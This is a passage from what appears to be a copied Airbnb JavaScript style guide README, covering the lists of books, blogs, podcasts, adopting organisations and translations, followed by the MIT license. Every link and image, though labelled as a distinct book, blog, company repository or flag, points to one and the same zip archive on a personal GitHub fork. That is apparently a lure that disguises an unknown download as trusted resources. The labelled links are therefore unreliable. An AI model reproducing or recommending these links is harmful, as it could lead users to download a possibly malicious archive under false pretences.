  - [Third Party JavaScript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - Ben Vinegar and Anton Kovalyov
  - [Effective JavaScript: 68 Specific Ways to Harness the Power of JavaScript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - David Herman
  - [Eloquent JavaScript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - Marijn Haverbeke
  - [You Don't Know JS: ES6 & Beyond](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) - Kyle Simpson

**Blogs**

  - [DailyJS](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - [JavaScript Weekly](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - [JavaScript, JavaScript...](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - [Bocoup Weblog](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - [Adequately Good](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - [NCZOnline](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - [Perfection Kills](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - [Ben Alman](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - [Dmitry Baranovskiy](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - [Dustin Diaz](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - [nettuts](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

**Podcasts**

  - [JavaScript Air](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - [JavaScript Jabber](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)


**[⬆ back to top](#table-of-contents)**

## In the Wild

  This is a list of organizations that are using this style guide. Send us a pull request and we'll add you to the list.

  - **4Catalyzer**: [4Catalyzer/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **Aan Zee**: [AanZee/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **Adult Swim**: [adult-swim/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **Airbnb**: [airbnb/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **Apartmint**: [apartmint/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **Ascribe**: [ascribe/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **Avalara**: [avalara/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **Avant**: [avantcredit/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **Billabong**: [billabong/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **Bisk**: [bisk/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **Blendle**: [blendle/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **Brainshark**: [brainshark/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **Chartboost**: [ChartBoost/javascript-style-guide](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **ComparaOnline**: [comparaonline/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **Compass Learning**: [compasslearning/javascript-style-guide](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **DailyMotion**: [dailymotion/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **DoSomething**: [DoSomething/eslint-config](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **Digitpaint** [digitpaint/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **Ecosia**: [ecosia/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **Evernote**: [evernote/javascript-style-guide](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **Evolution Gaming**: [evolution-gaming/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **EvozonJs**: [evozonjs/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **ExactTarget**: [ExactTarget/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **Expensify** [Expensify/Style-Guide](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **Flexberry**: [Flexberry/javascript-style-guide](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **Gawker Media**: [gawkermedia/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **General Electric**: [GeneralElectric/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **GoodData**: [gooddata/gdc-js-style](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **Grooveshark**: [grooveshark/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **How About We**: [howaboutwe/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **Huballin**: [huballin/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **HubSpot**: [HubSpot/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **Hyper**: [hyperoslo/javascript-playbook](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **InfoJobs**: [InfoJobs/JavaScript-Style-Guide](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **Intent Media**: [intentmedia/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **Jam3**: [Jam3/Javascript-Code-Conventions](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **JeopardyBot**: [kesne/jeopardy-bot](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **JSSolutions**: [JSSolutions/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **KickorStick**: [kickorstick/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **Kinetica Solutions**: [kinetica/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **M2GEN**: [M2GEN/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **Mighty Spring**: [mightyspring/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **MinnPost**: [MinnPost/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **MitocGroup**: [MitocGroup/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **ModCloth**: [modcloth/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **Money Advice Service**: [moneyadviceservice/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **Muber**: [muber/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **National Geographic**: [natgeo/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **National Park Service**: [nationalparkservice/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **Nimbl3**: [nimbl3/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **Orion Health**: [orionhealth/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **OutBoxSoft**: [OutBoxSoft/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **Peerby**: [Peerby/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **Razorfish**: [razorfish/javascript-style-guide](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **reddit**: [reddit/styleguide/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **React**: [https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **REI**: [reidev/js-style-guide](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **Ripple**: [ripple/javascript-style-guide](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **SeekingAlpha**: [seekingalpha/javascript-style-guide](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **Shutterfly**: [shutterfly/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **Springload**: [springload/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **StratoDem Analytics**: [stratodem/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **SteelKiwi Development**: [steelkiwi/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **StudentSphere**: [studentsphere/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **SysGarage**: [sysgarage/javascript-style-guide](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **Syzygy Warsaw**: [syzygypl/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **Target**: [target/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **TheLadders**: [TheLadders/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **The Nerdery**: [thenerdery/javascript-standards](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **T4R Technology**: [T4R-Technology/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **VoxFeed**: [VoxFeed/javascript-style-guide](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **WeBox Studio**: [weboxstudio/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **Weggo**: [Weggo/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **Zillow**: [zillow/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - **ZocDoc**: [ZocDoc/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

**[⬆ back to top](#table-of-contents)**

## Translation

  This style guide is also available in other languages:

  - ![br](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) **Brazilian Portuguese**: [armoucar/javascript-style-guide](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - ![bg](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) **Bulgarian**: [borislavvv/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - ![ca](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) **Catalan**: [fpmweb/javascript-style-guide](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - ![cn](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) **Chinese (Simplified)**: [sivan/javascript-style-guide](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - ![tw](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) **Chinese (Traditional)**: [jigsawye/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - ![fr](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) **French**: [nmussy/javascript-style-guide](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - ![de](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) **German**: [timofurrer/javascript-style-guide](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - ![it](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) **Italian**: [sinkswim/javascript-style-guide](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - ![jp](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) **Japanese**: [mitsuruog/javascript-style-guide](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - ![kr](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) **Korean**: [tipjs/javascript-style-guide](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - ![pl](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) **Polish**: [mjurczyk/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - ![ru](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) **Russian**: [uprock/javascript](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - ![es](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) **Spanish**: [paolocarrasco/javascript-style-guide](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - ![th](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) **Thai**: [lvarayut/javascript-style-guide](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
  - ![vn](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) **Vietnam**: [giangpii/javascript-style-guide](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

## The JavaScript Style Guide Guide

  - [Reference](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)

## Chat With Us About JavaScript

  - Find us on [gitter](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip).

## Contributors

  - [View Contributors](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)


## License

(The MIT License)

Copyright (c) 2014-2016 Airbnb

Permission is hereby granted, free of charge, to any person obtaining
a copy of this software and associated documentation files (the
'Software'), to deal in the Software without restriction, including
without limitation the rights to use, copy, modify, merge, publish,
distribute, sublicense, and/or sell copies of the Software, and to
permit persons to whom the Software is furnished to do so, subject to
the following conditions:

The above copyright notice and this permission notice shall be
included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED 'AS IS', WITHOUT WARRANTY OF ANY KIND,
EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY
CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

**[⬆ back to top](#table-of-contents)**

## Amendments

We encourage you to fork this guide and change the rules to fit your team's style guide. Below, you may list some amendments to the style guide. This allows you to periodically update your style guide without having to deal with merge conflicts.

# };
